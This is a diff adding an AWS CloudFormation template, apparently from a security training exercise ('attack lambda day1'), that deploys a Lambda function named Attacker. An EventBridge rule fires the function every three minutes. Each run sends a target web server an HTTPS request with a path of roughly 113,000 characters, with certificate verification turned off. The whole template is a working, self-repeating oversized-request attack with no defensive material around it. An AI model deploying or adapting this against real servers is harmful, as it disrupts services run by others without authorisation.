@@ -1,0 +1,72 @@
+AWSTemplateFormatVersion: 2010-09-09
+Description: >
+  Template for attack lambda day1
+Parameters:
+  targetURL:
+    Type: String
+    Description: attacker target instance public URL
+  AttackerRole:
+    Type: String
+    Description: Shared IAM Role
+
+Resources:
+  # Resources which make up your wrinkle
+  # AttackerRole:
+  #   Type: AWS::IAM::Role
+  #   Properties:
+  #     AssumeRolePolicyDocument:
+  #       Statement:
+  #         - Action: sts:AssumeRole
+  #           Effect: Allow
+  #           Principal:
+  #             Service: lambda.amazonaws.com
+  #       Version: "2012-10-17"
+  #     ManagedPolicyArns:
+  #       - Fn::Join:
+  #           - ""
+  #           - - "arn:"
+  #             - Ref: AWS::Partition
+  #             - :iam::aws:policy/service-role/AWSLambdaBasicExecutionRole
+
+  Attacker:
+    Type: AWS::Lambda::Function
+    Properties:
+      Handler: index.lambda_handler
+      MemorySize: 128
+      Role: !Ref AttackerRole
+      Runtime: python3.7
+      Timeout: 60
+      Environment:
+        Variables:
+          TargetURL: !Ref targetURL
+      Code:
+        ZipFile: |
+          import json, boto3, requests, urllib3, os
+          
+          def lambda_handler(event, context):
+            ec2_publicdns = os.environ['TargetURL']
+            moji = "/" + "a" * 110
+            path = moji * 1025
+            url = "https://" + ec2_publicdns + path
+            from urllib3.exceptions import InsecureRequestWarning
+            urllib3.disable_warnings(InsecureRequestWarning)
+    
+            attackcode = requests.get(url,verify=False)
+    
+  AttackerRule:
+    Type: AWS::Events::Rule
+    Properties:
+      Description: TLSI-3-minutes-rule
+      ScheduleExpression: cron(*/3 * * * ? *)
+      State: ENABLED
+      Targets:
+        - Arn: !GetAtt Attacker.Arn
+          Id: lambda
+
+  AttackerLambdaEvent:
+    Type: AWS::Lambda::Permission
+    Properties:
+      Action: lambda:InvokeFunction
+      FunctionName: !Ref Attacker
+      Principal: events.amazonaws.com
+      SourceArn: !GetAtt AttackerRule.Arn
